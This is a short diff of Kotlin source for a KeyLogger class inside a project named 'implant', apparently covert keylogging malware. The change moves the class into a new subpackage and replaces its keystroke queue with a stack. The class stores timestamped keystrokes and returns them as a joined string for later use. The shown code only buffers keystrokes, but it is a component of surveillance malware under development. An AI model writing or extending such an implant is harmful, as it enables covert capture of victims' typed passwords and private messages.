@@ -7,13 +7,14 @@
 * fired for them.
 * */
 
-package com.cooperthecoder.implant
+package com.cooperthecoder.implant.dagger
 
+import com.cooperthecoder.implant.Config
 import java.util.*
 
 class KeyLogger {
 
-    val keystrokeQueue: Queue<String> = LinkedList<String>()
+    val keystrokeStack: Stack<String> = Stack()
     var lastEvent = 0L
 
     fun recordKeystroke(keystroke: String, time: Long) {
@@ -24,12 +25,12 @@ class KeyLogger {
         }
 
         lastEvent = time
-        keystrokeQueue.add(keystroke)
+        keystrokeStack.push(keystroke)
     }
 
     fun emptyKeyQueue(): String {
-        val keystrokes = keystrokeQueue.joinToString("-")
-        keystrokeQueue.clear()
+        val keystrokes = keystrokeStack.joinToString("-")
+        keystrokeStack.clear()
         return keystrokes
     }
 }
